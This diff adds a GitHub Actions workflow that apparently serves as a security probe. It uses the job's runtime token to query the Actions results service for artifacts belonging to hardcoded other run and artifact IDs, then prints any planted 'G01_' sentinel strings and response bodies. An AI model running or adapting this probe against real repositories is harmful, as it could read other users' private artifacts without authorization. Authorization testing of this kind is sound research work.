@@ -1,0 +1,38 @@
+name: G01 Results Runtime Private Read
+
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+    steps:
+      - name: Probe run-scoped results service
+        shell: bash
+        run: |
+          set +e
+          url="${ACTIONS_RESULTS_URL%/}"
+          echo "results_url=${url%%/*}"
+          echo "runtime_token_length=${#ACTIONS_RUNTIME_TOKEN}"
+          for endpoint in \\
+            "$url/_apis/artifact/Artifacts?workflowRunBackendId=30854116091" \\
+            "$url/_apis/artifact/Artifact?artifactId=8871751823" \\
+            "$url/_apis/artifact/artifacts/8871751823"; do
+            echo "GET $endpoint"
+            curl -skS --max-time 8 -D /tmp/g01-h -o /tmp/g01-b -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$endpoint"
+            printf "status="; head -1 /tmp/g01-h
+            echo "sentinels=$(grep -Eo "G01_[A-Z0-9_]+" /tmp/g01-b | head -5)"
+            head -c 800 /tmp/g01-b; echo
+          done
+          for method in GetSignedArtifactURL GetArtifact; do
+            endpoint="$url/twirp/github.actions.results.api.v1.ArtifactService/$method"
+            echo "POST $endpoint"
+            curl -skS --max-time 8 -D /tmp/g01-h -o /tmp/g01-b -X POST -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" --data "{\\"artifactId\\":8871751823,\\"workflowRunBackendId\\":30854116091}" "$endpoint"
+            printf "status="; head -1 /tmp/g01-h
+            echo "sentinels=$(grep -Eo "G01_[A-Z0-9_]+" /tmp/g01-b | head -5)"
+            head -c 800 /tmp/g01-b; echo
+          done
+
